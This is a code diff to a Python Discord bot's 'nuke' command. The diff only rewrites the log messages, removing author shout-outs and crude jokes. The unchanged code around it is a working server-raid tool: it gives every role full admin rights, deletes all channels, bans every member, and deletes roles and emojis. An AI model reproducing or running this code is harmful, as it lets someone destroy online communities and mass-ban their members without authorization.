@@ -25,7 +25,7 @@ async def nuke(ctx):
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "gave everyone admin" + Fore.RESET)
    except:
-     print(Fore.GREEN + "Created By valentines" + Fore.RESET)
+     print(Fore.GREEN + "wasnt able to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
@@ -35,21 +35,21 @@ async def nuke(ctx):
    for member in guild.members:
     try:
       await member.ban(True)
-      print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned while nuking for my daddy valentines" + Fore.RESET)
+      print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned" + Fore.RESET)
     except:
-      print(Fore.GREEN + f"{member.name}#{member.discriminator} is too flat to be banned." + Fore.RESET)
+      print(Fore.GREEN + f"{member.name}#{member.discriminator} wasnt banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
-      print(Fore.MAGENTA + f"{role.name} was deleted cuz valentines runs me" + Fore.RESET)
+      print(Fore.MAGENTA + f"{role.name} was deleted" + Fore.RESET)
     except:
-      print(Fore.GREEN + f"{role.name} wasnt deleted and im super sorry daddy valentines" + Fore.RESET)
+      print(Fore.GREEN + f"{role.name} wasnt deleted " + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
-      print(Fore.MAGENTA + f"{emoji.name} was deleted because valentines runs you" + Fore.RESET)
+      print(Fore.MAGENTA + f"{emoji.name} was deleted " + Fore.RESET)
     except:
-      print(Fore.GREEN + f"{emoji.name} wasnt deleted and im super sorry daddy valentines :(" + Fore.RESET)
+      print(Fore.GREEN + f"{emoji.name} wasnt deleted " + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
